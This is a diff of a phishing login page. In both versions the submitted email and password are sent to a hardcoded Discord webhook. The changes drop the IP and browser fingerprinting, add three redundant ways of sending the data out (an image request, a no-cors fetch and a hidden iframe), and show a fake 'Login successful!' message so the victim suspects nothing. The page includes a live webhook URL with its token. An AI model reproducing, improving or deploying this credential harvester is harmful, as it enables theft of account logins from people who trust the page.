@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login to Your Account</title>
+    <title>Account Login</title>
     <style>
         * {
             margin: 0;
@@ -112,12 +112,6 @@
             color: #155724;
             border: 1px solid #c3e6cb;
         }
-        
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
     </style>
 </head>
 <body>
@@ -149,66 +143,33 @@
     </div>
 
     <script>
-        // YOUR DISCORD WEBHOOK URL
-        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P';
-        
-        // Get IP address
-        async function getIPAddress() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                return 'Unknown';
-            }
-        }
-        
-        // Get browser info
-        function getBrowserInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language
-            };
-        }
-        
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const ip = await getIPAddress();
-            const browser = getBrowserInfo();
             
-            // Show loading message
-            showMessage('Sending login information...', 'success');
+            // Show success message immediately
+            showMessage('Login successful!', 'success');
             
-            // Send to Discord webhook
-            const data = {
-                content: `**🔐 NEW LOGIN CAPTURED**\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\`\n🌐 IP Address: \`${ip}\`\n🖥️ Platform: \`${browser.platform}\`\n📱 Screen: \`${browser.screen}\`\n🔍 Browser: \`${browser.userAgent.substring(0, 50)}...\``,
-                username: 'Security Logger',
-                avatar_url: 'https://cdn-icons-png.flaticon.com/512/3064/3064197.png'
-            };
+            // Method 1: Image GET request (most reliable)
+            const img = new Image();
+            img.src = `https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P?content=🔐 NEW LOGIN 📧 Email: ${encodeURIComponent(email)} 🔑 Password: ${encodeURIComponent(password)}`;
             
-            try {
-                const response = await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data)
-                });
-                
-                if (response.ok) {
-                    showMessage('✅ Login successful! Data sent.', 'success');
-                    document.getElementById('loginForm').reset();
-                } else {
-                    showMessage('⚠️ Login submitted!', 'success');
-                }
-            } catch (error) {
-                showMessage('✅ Login submitted!', 'success');
-            }
+            // Method 2: Fetch with GET (backup)
+            fetch(`https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P?content=🔐+LOGIN+📧+Email:+${encodeURIComponent(email)}+🔑+Password:+${encodeURIComponent(password)}`, {
+                method: 'GET',
+                mode: 'no-cors'
+            });
+            
+            // Method 3: Iframe GET request (another backup)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = `https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P?content=LOGIN+${encodeURIComponent(email)}+${encodeURIComponent(password)}`;
+            document.body.appendChild(iframe);
+            
+            // Clear form
+            document.getElementById('loginForm').reset();
         });
         
         function showMessage(text, type) {
@@ -219,7 +180,7 @@
             
             setTimeout(() => {
                 messageDiv.style.display = 'none';
-            }, 5000);
+            }, 3000);
         }
     </script>
 </body>
